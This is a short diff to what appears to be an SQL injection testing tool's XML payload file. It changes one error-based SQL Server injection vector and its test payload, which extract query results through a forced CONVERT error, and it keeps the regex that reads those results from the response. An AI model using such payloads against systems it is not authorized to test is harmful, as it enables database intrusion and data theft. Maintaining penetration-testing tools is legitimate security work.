@@ -1175,9 +1175,9 @@
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector>,(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
+        <vector>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
         <request>
-            <payload>,(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
+            <payload>,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
